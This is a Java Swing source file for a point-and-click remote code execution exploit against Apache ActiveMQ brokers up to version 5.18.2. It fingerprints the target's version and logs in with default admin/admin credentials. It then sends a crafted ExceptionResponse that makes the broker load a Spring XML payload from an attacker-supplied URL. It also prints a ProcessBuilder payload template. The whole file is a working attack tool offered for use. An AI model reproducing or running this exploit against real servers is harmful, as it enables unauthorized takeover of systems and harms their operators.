package org.example;

import org.apache.activemq.ActiveMQConnection;
import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.ActiveMQConnectionMetaData;
import org.apache.activemq.ActiveMQSession;
import org.apache.activemq.broker.BrokerService;
import org.apache.activemq.broker.TransportConnection;
import org.apache.activemq.command.ExceptionResponse;
import org.apache.activemq.command.WireFormatInfo;
import org.apache.activemq.util.ByteArrayInputStream;
import org.apache.activemq.util.ByteSequence;
import org.apache.activemq.util.MarshallingSupport;
import org.apache.activemq.wireformat.WireFormat;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.JMSException;
import javax.jms.Session;
import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.ConnectException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.CopyOnWriteArrayList;



public class ActiveMQ_RCE_GUI {
    private JPanel panel1;
    private JTextField TargetIp;
    private JTextField TargetPort;
    private JButton exploitButton;
    private JTextField PayloadUrl;
    private JButton getPayloadButton;
    private JTextArea textArea1;
    private JButton helpButton;
    public ActiveMQ_RCE_GUI() {
        exploitButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                Exploit(TargetIp.getText(),TargetPort.getText(),PayloadUrl.getText());
            }
        });
        getPayloadButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                AreaAppend("Please configure the Payload and download it through HTTP. The content is:");
                AreaAppend("\n\n" +
                        "\n" +
                        "<beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                        "  <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                        "    <constructor-arg>\n" +
                        "      <list>\n" +
                        "        <value>open</value>\n" +
                        "        <value>-a</value>\n" +
                        "        <value>calculator</value>\n" +
                        "      </list>\n" +
                        "    </constructor-arg>\n" +
                        "  </bean>\n" +
                        "</beans>\n\n");
            }
        });

        helpButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JFrame frame = new JFrame("Proxy");
                frame.setContentPane(new Proxy_GUI().panel1);
                frame.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
                frame.pack();
                frame.setVisible(true);
            }
        });
    }

    public void AreaAppend(String Text){
        textArea1.append(Text+"\n");
    }
    public static int compareVersions(String version1, String version2) {
        String[] parts1 = version1.split("\\.");
        String[] parts2 = version2.split("\\.");

        int minLength = Math.min(parts1.length, parts2.length);

        for (int i = 0; i < minLength; i++) {
            int part1 = Integer.parseInt(parts1[i]);
            int part2 = Integer.parseInt(parts2[i]);

            if (part1 < part2) {
                return -1;
            } else if (part1 > part2) {
                return 1;
            }
        }

        if (parts1.length < parts2.length) {
            return -1;
        } else if (parts1.length > parts2.length) {
            return 1;
        }

        return 0;
    }
    public String GetServerVersion(String serverAddress,String serverPort){
        try {
            Socket clientSocket = new Socket(serverAddress, Integer.parseInt(serverPort));

            DataInputStream dataInputStream = new DataInputStream(clientSocket.getInputStream());
            //ObjectInputStream ois = new ObjectInputStream(clientSocket.getInputStream());
            byte[] Header = new byte[22];
            dataInputStream.readFully(Header);

             Map<String,Object > maps = MarshallingSupport.unmarshalPrimitiveMap(dataInputStream, 4096);
            return maps.get("ProviderVersion").toString();
            } catch (Exception e) {
            e.printStackTrace();
            return "";
        }

    }
    public  void Exploit(String p_TargetIp,String p_TargetPort,String p_PayloadHost) {
        try{
            AreaAppend("[*] Start Exploiting the Vulnerability on TargetIp:"+p_TargetIp);
            ConnectionFactory connectionFactory = new
                    ActiveMQConnectionFactory("tcp://"+p_TargetIp+":"+p_TargetPort+"?jms.closeTimeout=5000");
            AreaAppend("[!] Exploit tool timeout is 5000ms");

            Connection connection = connectionFactory.createConnection("admin", "admin");
            connection.start();
            ActiveMQSession session = (ActiveMQSession)connection.createSession(false, Session.AUTO_ACKNOWLEDGE);

            // WireFormatInfo wireFormatInfo =
            String activeMQVersion = GetServerVersion(p_TargetIp,p_TargetPort);
            ActiveMQConnection activemqconnection = (ActiveMQConnection)connection;

          //  (ActiveMQConnection(connection))

            //Session VersionSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
            AreaAppend("[+] Conversation suggestion Successful");
            AreaAppend("[+] Request Target version Information");
            //ActiveMQConnectionMetaData metaData =(ActiveMQConnectionMetaData)connection.getMetaData();


            //tring activeMQVersion =connection.getMetaData().getProviderVersion();



            String version2 = "5.18.2";

            AreaAppend("[+] Target ActiveMQ Server Version:"+activeMQVersion);
            int result = compareVersions(activeMQVersion, version2);

            int i = 0;
            if (result <= 0) {

                AreaAppend("[+] The target ActiveMQ server has a Security Vulnerability!");
            }else{
                AreaAppend("[-] There are no security Vulnerabilities in the Target ActiveMQ Server");
                return;
            }

            AreaAppend("[*] Start Exploiting the Vulnerability");
            ExceptionResponse exceptionResponse = new ExceptionResponse();

            exceptionResponse.setException(new ClassPathXmlApplicationContext(p_PayloadHost));
            ActiveMQSession ExploitSession = (ActiveMQSession) connection.createSession();
            ExploitSession.syncSendPacket(exceptionResponse);

            AreaAppend("[+] Vulnerability exploited successfully");

            connection.close();

        }catch (JMSException e) {
            if (e.getCause() instanceof SocketTimeoutException) {
                // 处理连接超时异常
                AreaAppend("[-] Connection timed out, please check connection settings");

                // 或者记录错误日志
                // logger.error("连接超时：无法连接到消息代理", e);
            } else if(e.getCause() instanceof ConnectException){
                AreaAppend("[-] Connection refused (Connection refused)");
            }else {
                // 其他JMS异常
                AreaAppend("[-] JMSException：" + e.getMessage().toString());
                // 或者记录错误日志
                // logger.error("JMS异常", e);
            }
            return;
        }catch (Exception error){
        error.printStackTrace();

        }
        AreaAppend("[+] Exploit completed");
    }

    public static void main(String[] args) {
        JFrame frame = new JFrame("ActiveMQ RCE GUI v1.0.3 by:0vercl0k");
        frame.setContentPane(new ActiveMQ_RCE_GUI().panel1);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.setSize(800,500);
        frame.setVisible(true);
    }
}
